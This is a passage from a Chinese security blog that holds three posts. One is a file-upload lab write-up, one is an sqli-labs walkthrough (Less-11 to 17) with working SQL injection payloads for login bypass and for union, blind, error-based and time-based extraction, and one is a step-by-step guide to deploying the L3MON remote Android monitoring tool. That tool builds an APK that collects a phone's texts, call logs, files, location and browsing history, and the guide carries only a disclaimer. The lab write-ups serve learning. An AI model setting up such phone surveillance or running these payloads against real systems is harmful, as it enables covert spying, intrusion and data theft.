src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image52.png" alt="image52"></p><h2 id="方法1——通过指定文件名的修改"><a href="#方法1——通过指定文件名的修改" class="headerlink" title="方法1——通过指定文件名的修改"></a>方法1——通过指定文件名的修改</h2><p>上传php文件并抓包</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image53.png" alt="image53"></p><p>对其进行修改</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image54.png" alt="image54"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image55.png" alt="image55"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image56.png" alt="image56"></p><h2 id="方法2——修改文件夹名称"><a href="#方法2——修改文件夹名称" class="headerlink" title="方法2——修改文件夹名称"></a>方法2——修改文件夹名称</h2><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image57.png" alt="image57"></p><p>上传php文件并抓包，修改文件夹名称</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image58.png" alt="image58"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image59.png" alt="image59"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image60.png" alt="image60"></p><h1 id="Poss-21"><a href="#Poss-21" class="headerlink" title="Poss-21"></a>Poss-21</h1><p>分析源码</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image61.png" alt="image61"></p><p>我们上传抓包，给save_name赋值为一个数组，将数组第一位赋值为hack.php，最后一位赋值为jpg</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image62.png" alt="image62"></p><p>上传成功！</p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image63.png" alt="image63"></p><p><img src="/2021/12/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image64.png" alt="image64"></p><p>靶场练习结束！</p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">L3MON-安卓手机监控教程</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-12-01 15:05:27 / 修改时间：15:55:38" itemprop="dateCreated datePublished" datetime="2021-12-01T15:05:27+08:00">2021-12-01</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.7k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="注明"><a href="#注明" class="headerlink" title="注明"></a>注明</h1><p>本文仅供学习交流和技术分享，禁止用于任何违法行为！详细参考《中华人民共和国网络安全法》，软件本为开源，本人只是介绍安装技术，如果进行违法犯罪活动与本人无关，请大家遵纪守法，做合法公民，健康上网，远离犯罪。</p><h1 id="L3MON软件介绍"><a href="#L3MON软件介绍" class="headerlink" title="L3MON软件介绍"></a>L3MON软件介绍</h1><ul><li>L3MON是一个基于云端的远程安卓管理套件</li><li>可以通过云端管理以下资料访问</li><li>手机短信</li><li>通话记录、通话时长</li><li>手机系统的文件</li><li>手机安装的程序</li><li>GPS定位</li><li>浏览器页面访问记录</li></ul><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image1.png" alt="image1"></p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a><strong>搭建环境</strong></h1><p><strong>ubuntu18.04</strong></p><p>本人在阿里云上申请了一台云服务器，系统为ubuntu18.04，申请步骤可网上自行参考资料。进入ubuntu系统</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image2.png" alt="image2"></p><p><strong>安装java 1.8.0</strong></p><p>L3MON软件仅支持java1.8.0，所以java版本过高过低都不行，申请的ubuntu系统是默认没有安装java的。</p><p>在linux上安装java有多种方式，我这里使用命令行模式安装推荐安装openjdk</p><p>首先更新软件包列表</p><p><code>apt-get update</code></p><p>然后安装openjdk-8-jdk</p><p><code>apt-get install openjdk-8-jdk</code></p><p>安装结束后查看一下java版本</p><p><code>java -version</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image3.png" alt="image3"></p><p><strong>安装node.js和npm</strong></p><p><code>apt install nodejs npm</code></p><p>查看nodejs和npm版本</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image4.png" alt="image4"></p><p><strong>安装pm2依赖</strong></p><p><code>npm install pm2 -g</code></p><p><strong>安装git命令</strong></p><p><code>apt install apt</code></p><p>在阿里云上clone速度很慢，需要更改一下配置文件，编辑<code>/etc/ssh/ssh_config</code>，找到<code>GSSAPIAuthentication no</code>，将注释符删掉即可。</p><p><code>vim /etc/ssh/ssh_config</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image5.png" alt="image5"></p><p><strong>克隆L3MON项目</strong></p><p><code>git clone https://github.com/D3VL/L3MON</code></p><p><strong>进入L3MON的server目录</strong></p><p><code>cd L3MON/server/</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image6.png" alt="image6"></p><p><strong>运行L3MON</strong></p><p><code>pm2 start index.js</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image7.png" alt="image7"></p><p><code>pm2 startup</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image8.png" alt="image8"></p><p>启动apache2服务，如果没有apache2服务，可以先安装一下</p><p><strong>安装apache2</strong></p><p><code>apt install apache2</code></p><p><strong>启动apache2服务（默认端口是80）</strong></p><p><code>service apache2 start</code></p><p><strong>查看apache2运行状态</strong></p><p><code>service apache2 status</code></p><p>由于L3MON登录需要配置用户名和密码，因此先<strong>暂停L3MON服务</strong></p><p><code>pm2 stop index</code></p><p><strong>配置maindb.json</strong></p><p><code>vim maindb.json</code></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image9.png" alt="image9"></p><p>直接将内容全部替换为如下</p><p><code>&#123;</code><br><code>&quot;admin&quot;:&#123;</code><br><code>&quot;username&quot;:&quot;admin&quot;,</code><br><code>&quot;password&quot;:&quot;25d55ad283aa400af464c76d713c07ad&quot;,</code><br><code>&quot;loginToken&quot;:&quot;&quot;,</code><br><code>&quot;logs&quot;:[],</code><br><code>&quot;iplog&quot;:[]</code></p><p><code>&#125;, &quot;clients&quot;:[]</code></p><p><code>&#125;</code></p><p>其中username是登录的用户名，password是登录密码的MD5值，如果想改其他密码就输入想设置密码的MD5值即可。</p><p>L3MON的默认端口是22533，于是我们得去服务器后台把该开启的端口全给开了，不然登陆不进去。</p><p><strong>进入服务器实例——安全组</strong></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image10.png" alt="image10"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image11.png" alt="image11"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image12.png" alt="image12"></p><p>其中80、22533分别是apache2和L3MON的端口，22222是L3MON生成app的指定端口</p><p><strong>现在浏览器输入http://服务器公网ip:L3MON端口</strong></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image13.png" alt="image13"></p><p><strong>用之前设置的用户名和密码登录即可</strong></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image14.png" alt="image14"></p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image15.png" alt="image15"></p><p><strong>这里输入你服务器的公网ip，后面端口任意指定（端口开启且不被占用）</strong></p><p>就能生成app，然后安卓手机安装之后就能点击Devices来监控安卓手机信息！</p><p><img src="/2021/12/01/L3MON-%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E7%9B%91%E6%8E%A7%E6%95%99%E7%A8%8B/image16.png" alt="image16"></p><p><strong>结束！勿用于任何违法行为！仅供参考！（吃皇粮、银手镯警告！）</strong></p><p>文章参考于</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/120383035">https://blog.csdn.net/weixin_46706771/article/details/120383035</a></p><p><a target="_blank" rel="noopener" href="https://www.iculture.cc/sg/pig=2373">https://www.iculture.cc/sg/pig=2373</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">sqlilabs——sql注入学习（二）</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-11-28 21:42:23" itemprop="dateCreated datePublished" datetime="2021-11-28T21:42:23+08:00">2021-11-28</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-02-27 15:44:05" itemprop="dateModified" datetime="2022-02-27T15:44:05+08:00">2022-02-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>9.1k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>8 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="四、Sqlilabs关卡学习"><a href="#四、Sqlilabs关卡学习" class="headerlink" title="四、Sqlilabs关卡学习"></a>四、Sqlilabs关卡学习</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>这关开始进入到post注入的内容，什么是post呢？就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证，这就是一次post的过程。</p><p>例如<strong>Less-11</strong>，我们输入正确的用户名和密码后，会有如下显示</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image1.png" alt="image1"></p><p>我们可以看到源码，当我们输入用户名和密码后整合成的sql语句是这样的</p><p><code>SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image2.png" alt="image2"></p><p>我们试一下在用户名或者密码那里加上单引号和注释符，再正确输入用户名和密码试试</p><p>看看情况</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image3.png" alt="image3"></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image4.png" alt="image4"></p><p>均有报错，我们可以试试万能密码:</p><p>username：admin’or’1’=‘1#</p><p>password：asd(随便输)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image5.png" alt="image5"></p><p>通过了，此时的sql语句是这样的</p><p><code>SELECT username, password FROM users WHERE username=&#39;admin&#39;or&#39;1&#39;=&#39;1# and password=&#39;asd&#39; LIMIT 0,1</code></p><p>在#后面的内容全部被注释掉，前面的内容由于带有or 1=1恒成立，因此语句成立，此时以admin的用户登录，接下来可以尝试用get注入中用到的其他语句来代替or 1=1进行注入。</p><p>比如，<strong>利用union注入:</strong></p><p>username：1admin’ union select 1,database()#</p><p>password：asd(随便输)</p><p>同样的前面的1admin是为了显示出后面的查询内容</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image6.png" alt="image6"></p><p>这样就注入成功！</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>本关和Less-11类似，只是在id的参数由单引号变为了双引号加圆括号，我们这里改变输入成这样</p><p>username：1admin”) union select 1,database()#</p><p>password：asd(随便输入)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image7.png" alt="image7"></p><p>注入成功！</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>我们可以看到源码，id的赋值还是单引号加圆括号，但是后面的输出被注释掉了，所以我们这里是没有信息回显的</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image8.png" alt="image8"></p><p>输入：</p><p>username：admin’) union select 1,2#</p><p>password：asd(随便输)</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image9.png" alt="image9"></p><p>所以我们就得考虑盲注了。</p><p>例如使用布尔类型的盲注，猜测数据库的第一位</p><p>username：admin’) and left(database(),1)&gt;’a’#</p><p>password：asd(随便输)</p><p>发现没报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image10.png" alt="image10"></p><p>因为数据库的名字是security，第一位s明显大于a，如果判断错误，比如这样输入</p><p>username：admin’) and left(database(),1)&lt;’a’#</p><p>password：asd(随便输)</p><p>就会报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image11.png" alt="image11"></p><p>后面的注入与之前相同。</p><p><strong>注意：</strong>这里的注入过程我都是在输入框里面进行的，其实我们也可以通过burpsuite来抓取完整的sql语句来进行注入，不进行介绍了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>随便输入测试一下</p><p>username：admin”</p><p>password：asd（随意）</p><p>发现报错</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image12.png" alt="image12"></p><p>这样我们就知道传参进行了双引号操作，这里同Less-13</p><p><strong>盲注：</strong></p><p>username：admin”and left(database(),1)&gt;’a’#</p><p>password：asd（随便输）</p><p>同样的显示正常。</p><p><strong>报错注入：</strong></p><p>username：admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>password：asd（随便输）</p><p>爆版本</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image13.png" alt="image13"></p><p>username：admin”and extractvalue(1,concat(0x7e,(select database()),0x7e))#</p><p>password：asd（随便输）</p><p>爆数据库名称</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image14.png" alt="image14"></p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这关没正确和错误的提示，因此考虑延时注入，可以看到源码中的sql语句，有单引号</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image15.png" alt="image15"></p><p>我们输入如下：</p><p>username：admin’and if(ascii(substr(database(),1,1))=115,1,sleep(5))#</p><p>password：asd(随便输)</p><p>没有时间延迟说明数据库名的第一位猜对了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>本关和<strong>Less-15</strong>相同，只不过对参数的处理从单引号变为了双引号。</p><h2 id="补充知识——增删改查函数介绍"><a href="#补充知识——增删改查函数介绍" class="headerlink" title="补充知识——增删改查函数介绍"></a>补充知识——增删改查函数介绍</h2><h3 id="1-增加一行数据——insert"><a href="#1-增加一行数据——insert" class="headerlink" title="1.增加一行数据——insert"></a>1.增加一行数据——<strong>insert</strong></h3><p><strong>举例</strong></p><p><code>insert into wp_news values(3,&#39;abaaba&#39;,&#39;hello world!&#39;);</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image16.png" alt="image16"></p><h3 id="2-删除数据——delete"><a href="#2-删除数据——delete" class="headerlink" title="2.删除数据——delete"></a>2.删除数据——delete</h3><p>delete from 表名;</p><p>delete from 表名 where id=1;</p><p><strong>举例</strong></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image17.png" alt="image17"></p><h3 id="3-删除结构——drop"><a href="#3-删除结构——drop" class="headerlink" title="3.删除结构——drop"></a>3.删除结构——drop</h3><p>删数据库：drop database 数据库名;</p><p>删除表：drop table 表名;</p><p>删除表中的列：alter table 表名 drop column 列名;</p><h3 id="4-修改——update"><a href="#4-修改——update" class="headerlink" title="4.修改——update"></a>4.修改——update</h3><p>修改所有：update 表名 set 列名=’新的值，不是数字的话加单引号’;</p><p>待条件的修改：update 表名 set 列名=’新的值，不是数字的话加单引号’ where id=6;</p><p><strong>举例：</strong></p><p><code>update wp_news set title=&#39;fuck&#39; where id=2;</code></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image18.png" alt="image18"></p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这关我们可以看到是一个修改密码的过程，利用的是update语句，与在用select时是一样的，我们仅需要将原先的闭合，再构造自己的payload。</p><p>查看登录用的账号和密码</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image19.png" alt="image19"></p><p>尝试输入：</p><p>User Name：admin</p><p>New Password：1’</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image20.png" alt="image20"></p><p>从报错信息我们可以看到对参数password的处理是单引号。</p><p>考虑报错注入</p><p>User Name：admin</p><p>New Password：11’and left(database(),1)&gt;’a’#</p><p>这里发现个问题，用这个输入的话整个列表users的密码都会更改，而且不是更改成11，而是1！很奇怪！<strong>（后面再看）</strong></p><p>利用其他的报错注入，爆版本号</p><p>User Name：admin</p><p>New Password：11’and extractvalue(1,concat(0x7e,(select@@version),0x7e))#</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image21.png" alt="image21"></p><p>延时注入也可以，不再演示。</p><p><strong>我们可以看源代码，在执行update语句之前会先执行一次select语句，为什么我们不从username处进行构造呢？</strong></p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image22.png" alt="image22"></p><p>我们再看一下源代码中的check_input()函数</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image23.png" alt="image23"></p><p>再介绍其中几个函数</p><p><strong>1.addslashes(string)</strong></p><p>string 必需。规定要转义的字符串</p><p>返回值 返回已转义的字符串。</p><p>addslasher()函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号’’</li><li>双引号””</li><li>反斜杠\</li><li>NULL</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>注释：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以您<br>不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可<br>以使用函数get_magic_quotes_gpc()进行检测。</p><p><strong>2.stripslasher(string,connection)</strong></p><p>string 必需。规定要转义的字符串。</p><p>connection 可选。规定Mysql连接。如果未规定，则用上一个连接。</p><p>函数删除由addslashes()函数添加的反斜杠。</p><p>3.mysql_real_escape_string()</p><p>函数转义SQL语句中使用的字符串中的特殊字符。</p><p>以下字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><p>说明：本函数将string中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于mysql_query()。</p><p>可以看到在less17的check_input()中，对username进行各种转义的处理，所以此处不能使用<br>username进行注入。</p><p><img src="/2021/11/28/sqlilabs%E2%80%94%E2%80%94sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/image24.png" alt="image24"></p><h2 id="补充知识——HTTP头部介绍"><a href="#补充知识——HTTP头部介绍" class="headerlink" title="补充知识——HTTP头部介绍"></a>补充知识——HTTP头部介绍</h2><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。</p><p><strong>HTTP头部详解</strong></p><p><strong>1.Accept:</strong></p><p>告诉WEB服务器自己接受什么介质类型，*/*表示任何类型，type/*表示该类型下的所有子类型 ，type/sub-type。</p><p><strong>2.Accept-Charset:</strong></p><p>浏览器申明自己接收的字符集</p><p><strong>3.Accept-Encoding:</strong></p><p>浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）</p><p><strong>4.Accept-Language:</strong></p><p>浏览器申明自己接收的语言</p><p><strong>（注：语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。)</strong></p><p><strong>5.Accept-Ranges:</strong></p><p>WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</p><p><strong>6.Age:</strong></p><p>当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</p><p><strong>7.Authorization:</strong></p><p>当客户端接收到来自WEB服务器的WWW-Authenticate响应时，用该头部来回应自己的身份验证信息给WEB服务器。</p><p><strong>8.Cache-Control:</strong></p><p>请求：</p><p>no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br>max-age：（只接受Age值小于max-age值，并且没有过期的对象）<br>max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale值）<br>min-fresh：（接受其新鲜生命期大于其当前Age跟min-fresh值之和的缓存对象）<br>响应：</p><p>public：（可以用Cached内容回应任何用户)<br>private：（只能用缓存